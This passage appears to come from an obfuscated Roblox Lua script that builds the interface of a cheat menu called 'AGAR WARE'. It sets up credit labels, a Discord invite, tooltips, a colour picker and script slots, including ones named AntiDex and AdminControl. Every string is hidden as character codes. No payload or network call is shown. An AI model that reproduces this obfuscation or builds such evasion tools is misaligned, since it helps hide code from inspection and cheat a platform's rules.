_llza[_sc(51,99,100)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,99,99)]);
_llza[_sc(51,99,100)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,99,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,99,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,99,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,99,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,99,100)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(51,99,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,99,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(51,99,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,99,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,99,100)][_sc(84,101,120,116)]=[[Credits]];
_llza[_sc(51,99,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,99,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,99,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(51,99,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,99,100)]);
_llza[_sc(51,99,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,99,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,99,100)]);
_llza[_sc(51,99,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(51,100,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,53)]);
_llza[_sc(51,100,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,100,48)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,100,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,48)][_sc(78,97,109,101)]=[[pealz]];
_llza[_sc(51,100,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,100,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,100,48)]);
_llza[_sc(51,100,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,100,50)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,100,48)]);
_llza[_sc(51,100,50)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,100,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,100,50)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,100,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,100,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,100,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,50)][_sc(84,101,120,116)]=[[@0pealz]];
_llza[_sc(51,100,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,50)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,100,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,100,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,100,50)]);
_llza[_sc(51,100,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,100,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,100,50)]);
_llza[_sc(51,100,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,100,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,53)]);
_llza[_sc(51,100,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,100,53)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,100,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,53)][_sc(78,97,109,101)]=[[mental]];
_llza[_sc(51,100,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,100,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,100,53)]);
_llza[_sc(51,100,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,100,55)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,100,53)]);
_llza[_sc(51,100,55)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,100,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,100,55)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,100,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,100,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,100,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,55)][_sc(84,101,120,116)]=[[@2AreYouMental110]];
_llza[_sc(51,100,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,55)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,100,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,100,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,100,55)]);
_llza[_sc(51,100,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,100,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,100,55)]);
_llza[_sc(51,100,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,100,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,99,53)]);
_llza[_sc(51,100,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(51,100,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(51,100,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,97)][_sc(78,97,109,101)]=[[frisemain]];
_llza[_sc(51,100,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(51,100,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,100,97)]);
_llza[_sc(51,100,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(51,100,99)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,100,97)]);
_llza[_sc(51,100,99)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,100,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,100,99)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,100,99)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(51,100,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,100,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,100,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,99)][_sc(84,101,120,116)]=[[@frisemain]];
_llza[_sc(51,100,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,99)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(51,100,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,100,100)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,100,99)]);
_llza[_sc(51,100,100)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(51,100,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,100,99)]);
_llza[_sc(51,100,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,100,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,97,101)]);
_llza[_sc(51,100,102)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 50);
_llza[_sc(51,100,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,100,102)][_sc(78,97,109,101)]=[[toparea]];
_llza[_sc(51,100,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,100,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,100,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0, 0);
_llza[_sc(51,100,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,101,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,100,102)]);
_llza[_sc(51,101,48)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,101,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,101,48)][_sc(82,105,99,104,84,101,120,116)]=true;
_llza[_sc(51,101,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,101,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,101,48)][_sc(84,101,120,116,83,105,122,101)]=46;
_llza[_sc(51,101,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0.5, 0);
_llza[_sc(51,101,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,101,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101,48)][_sc(84,101,120,116)]=[[AGAR WARE]];
_llza[_sc(51,101,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,101,48)][_sc(78,97,109,101)]=[[title]];
_llza[_sc(51,101,49)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,101,48)]);
_llza[_sc(51,101,49)][_sc(78,97,109,101)]=_sc(105,110,116,114,111);
_llza[_sc(51,101,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,101,48)]);
_llza[_sc(51,101,50)][_sc(67,111,108,111,114)]=Color3.fromRGB(0, 54, 110);
_llza[_sc(51,101,50)][_sc(76,105,110,101,74,111,105,110,77,111,100,101)]=Enum.LineJoinMode.Miter;
_llza[_sc(51,101,51)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,100,102)]);
_llza[_sc(51,101,51)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,101,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,101,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,101,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,101,51)][_sc(84,101,120,116,83,105,122,101)]=11;
_llza[_sc(51,101,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0.5, 0);
_llza[_sc(51,101,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,101,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101,51)][_sc(84,101,120,116)]=[[> discord.gg/7fDasxV2Ht <]];
_llza[_sc(51,101,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,101,51)][_sc(78,97,109,101)]=[[discord]];
_llza[_sc(51,101,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.5, 0);
_llza[_sc(51,101,52)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,101,51)]);
_llza[_sc(51,101,52)][_sc(78,97,109,101)]=_sc(105,110,116,114,111);
_llza[_sc(51,101,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,49)]);
_llza[_sc(51,101,53)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(51,101,53)][_sc(78,97,109,101)]=[[blackstroke]];
_llza[_sc(51,101,53)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(51,101,54)]=Instance.new(_sc(85,73,83,99,97,108,101),_llza[_sc(54)]);
_llza[_sc(51,101,55)]=Instance.new(_sc(85,73,83,99,97,108,101),_llza[_sc(49)]);
_llza[_sc(51,101,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49)]);
_llza[_sc(51,101,56)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(51,101,56)][_sc(83,105,122,101)]=UDim2.new(0, 100, 0, 100);
_llza[_sc(51,101,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101,56)][_sc(78,97,109,101)]=[[Color]];
_llza[_sc(51,101,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,101,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,101,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(51,101,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49)]);
_llza[_sc(51,101,57)][_sc(90,73,110,100,101,120)]=1000000009;
_llza[_sc(51,101,57)][_sc(83,105,122,101)]=UDim2.new(0, 100, 0, 20);
_llza[_sc(51,101,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,101,57)][_sc(78,97,109,101)]=[[Tooltip]];
_llza[_sc(51,101,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.68056, 0, 0.81319, 0);
_llza[_sc(51,101,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,101,97)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,101,57)]);
_llza[_sc(51,101,97)][_sc(78,97,109,101)]=_sc(116,111,111,108,116,105,112,83,99,114,105,112,116);
_llza[_sc(51,101,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,101,57)]);
_llza[_sc(51,101,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,101,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101,98)][_sc(78,97,109,101)]=[[tooltipFade]];
_llza[_sc(51,101,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,101,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,101,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(51,101,98)]);
_llza[_sc(51,101,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(51,101,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(51,101,100)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(51,101,57)]);
_llza[_sc(51,101,100)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(51,101,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(51,101,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,101,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(51,101,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(51,101,100)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(51,101,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(51,101,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(51,101,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(51,101,100)][_sc(84,101,120,116)]=[[--]];
_llza[_sc(51,101,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(51,101,100)][_sc(90,73,110,100,101,120)]=999999999;
_llza[_sc(51,101,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,101,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(51,101,100)]);
_llza[_sc(51,101,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(51,101,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(51,101,100)]);
_llza[_sc(51,101,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(51,102,48)]=Instance.new(_sc(85,73,83,99,97,108,101),_llza[_sc(51,101,57)]);
_llza[_sc(51,102,49)]=Instance.new(_sc(70,111,108,100,101,114),_llza[_sc(49)]);
_llza[_sc(51,102,50)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,50)][_sc(78,97,109,101)]=_sc(84,111,103,103,108,101,77,97,115,116,101,114);
_llza[_sc(51,102,51)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,51)][_sc(78,97,109,101)]=_sc(66,117,116,116,111,110,77,97,115,116,101,114);
_llza[_sc(51,102,52)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,52)][_sc(78,97,109,101)]=_sc(84,101,120,116,98,111,120,77,97,115,116,101,114);
_llza[_sc(51,102,53)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,53)][_sc(78,97,109,101)]=_sc(83,108,105,100,101,114,77,97,115,116,101,114);
_llza[_sc(51,102,54)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,54)][_sc(78,97,109,101)]=_sc(68,114,111,112,100,111,119,110,77,97,115,116,101,114);
_llza[_sc(51,102,55)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,55)][_sc(78,97,109,101)]=_sc(67,111,108,111,114,80,105,99,107,101,114,77,97,115,116,101,114);
_llza[_sc(51,102,56)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,56)][_sc(78,97,109,101)]=_sc(67,104,97,116,77,97,115,116,101,114);
_llza[_sc(51,102,57)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,57)][_sc(78,97,109,101)]=_sc(77,65,73,78,67,65,76,76,83);
_llza[_sc(51,102,97)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,49)]);
_llza[_sc(51,102,97)][_sc(78,97,109,101)]=_sc(78,111,116,105,102);
_llza[_sc(51,102,98)]=Instance.new(_sc(70,111,108,100,101,114),_llza[_sc(49)]);
_llza[_sc(51,102,99)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,98)]);
_llza[_sc(51,102,99)][_sc(78,97,109,101)]=_sc(65,110,116,105,68,101,120);
_llza[_sc(51,102,100)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,98)]);
_llza[_sc(51,102,100)][_sc(78,97,109,101)]=_sc(65,100,109,105,110,67,111,110,116,114,111,108);
_llza[_sc(51,102,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49)]);
_llza[_sc(51,102,101)][_sc(90,73,110,100,101,120)]=1000000011;
_llza[_sc(51,102,101)][_sc(83,105,122,101)]=UDim2.new(0, 200, 0, 270);
_llza[_sc(51,102,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(51,102,101)][_sc(78,97,109,101)]=[[ColorPicker]];
_llza[_sc(51,102,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.54615, 0, 0.6233, 0);
_llza[_sc(51,102,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(51,102,102)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(51,102,101)]);
_llza[_sc(51,102,102)][_sc(78,97,109,101)]=_sc(99,111,108,111,114,112,105,99,107,101,114,83,99,114,105,112,116);
_llza[_sc(52,48,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(51,102,101)]);
_llza[_sc(52,48,48)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(52,48,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,48,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,48)][_sc(78,97,109,101)]=[[innerframelayout]];
_llza[_sc(52,48,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,48)]);
_llza[_sc(52,48,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(52,48,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,49)][_sc(78,97,109,101)]=[[ACCENT]];
_llza[_sc(52,48,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,49)]);
_llza[_sc(52,48,50)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(52,48,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,50)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(52,48,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(52,48,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(52,48,51)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(52,48,50)]);
_llza[_sc(52,48,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(52,48,48)]);
_llza[_sc(52,48,52)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(52,48,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,48,52)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(52,48,52)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(52,48,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(52,48,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(52,48,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
